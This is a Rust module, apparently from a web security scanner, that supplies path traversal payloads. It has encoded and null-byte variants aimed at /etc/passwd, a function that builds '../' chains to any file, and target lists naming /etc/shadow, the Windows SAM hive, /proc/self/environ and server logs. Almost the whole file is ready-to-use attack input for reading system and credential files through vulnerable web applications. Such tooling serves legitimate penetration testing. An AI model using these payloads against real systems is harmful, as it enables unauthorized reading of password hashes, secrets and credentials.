//! Path traversal payloads

/// Path traversal payload
#[derive(Debug, Clone)]
pub struct TraversalPayload {
    pub name: String,
    pub payload: String,
}

impl TraversalPayload {
    pub fn new(name: &str, payload: &str) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
        }
    }
}

/// Basic traversal patterns
pub fn basic_payloads() -> Vec<TraversalPayload> {
    vec![
        TraversalPayload::new("Basic ../", "../../../etc/passwd"),
        TraversalPayload::new("URL encoded", "..%2F..%2F..%2Fetc%2Fpasswd"),
        TraversalPayload::new("Double URL encoded", "..%252F..%252F..%252Fetc%252Fpasswd"),
        TraversalPayload::new("Null byte", "../../../etc/passwd%00"),
        TraversalPayload::new("Backslash", "..\\..\\..\\etc\\passwd"),
    ]
}

/// Generate traversal payload for target file
pub fn for_file(target: &str, depth: usize) -> String {
    format!("{}{}", "../".repeat(depth), target)
}

/// Windows path targets
pub fn windows_targets() -> Vec<&'static str> {
    vec![
        "windows/system32/config/sam",
        "windows/win.ini",
        "windows/system.ini",
        "boot.ini",
    ]
}

/// Linux path targets
pub fn linux_targets() -> Vec<&'static str> {
    vec![
        "etc/passwd",
        "etc/shadow",
        "etc/hosts",
        "proc/self/environ",
        "var/log/apache2/access.log",
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_for_file() {
        let payload = for_file("etc/passwd", 5);
        assert!(payload.starts_with("../"));
        assert!(payload.ends_with("etc/passwd"));
    }
}
